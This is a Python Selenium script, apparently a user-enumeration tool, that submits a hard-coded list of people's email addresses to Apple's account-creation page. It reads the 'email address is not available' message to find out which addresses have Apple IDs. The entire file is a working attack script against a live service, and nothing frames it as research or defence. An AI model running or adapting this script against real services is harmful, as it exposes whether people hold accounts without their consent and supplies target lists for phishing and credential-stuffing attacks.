#  User Enum Apple

from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from time import sleep
import extract_html_diff

driver = webdriver.Edge(executable_path='msedgedriver')


print("The usernames present in Apple are:")

for i in ["ccohen@aol.com", "keijser@aol.com", "ajohnson@hotmail.com", "rnewman@aol.com", "sfoskett@hotmail.com", "seurat@aol.com", "richard@gmail.com", "punkis@gmail.com", "jadavis@outlook.com", "staffelb@att.net", "pplinux@icloud.com", "lamky@optonline.net", "ccoerhen@aol.com", "keijserqer@aol.com", "ajohneesdson@hotmail.com", "rnewman@aol.com", "sfosksdett@hotmail.com", "seusdrat@aol.com", "richard@gmail.com", "pssunkis@gmail.com", "jadavssis@outlook.com", "stafssfelb@att.net", "pplinsdux@icloud.com", "laamky@optonline.net"]:

    user = i

    driver.get("https://appleid.apple.com/account?localang=US-EN&app_id=2083&returnURL=https%3A//secure2.store.apple.com/shop/signIn%3Fc%3DaHR0cHM6Ly93d3cuYXBwbGUuY29tL3Nob3AvYmFnfDFhb3NjY2QxZjg4ZGZjYjY4YWRhNWZmMmY5ZTY5YWMzNjE0OTYyMjZlOWMz%26r%3DSCDHYHP7CY4H9XK2H%26s%3DaHR0cHM6Ly93d3cuYXBwbGUuY29tL3Nob3AvYmFnfDFhb3NjY2QxZjg4ZGZjYjY4YWRhNWZmMmY5ZTY5YWMzNjE0OTYyMjZlOWMz")

    p1 = driver.page_source
    #elem=driver.find_element_by_name("Mobile Number or Email")
    elem=driver.find_element_by_xpath("//input[@type='email']") #type = 'text'/'email'
    elem.send_keys(user)
    elem.send_keys(Keys.RETURN)
    sleep(2)
    p2 = driver.page_source
    p3 = extract_html_diff.as_string(p2,p1)


    if "This email address is not available. Choose a different address." in p3:
        print(i)
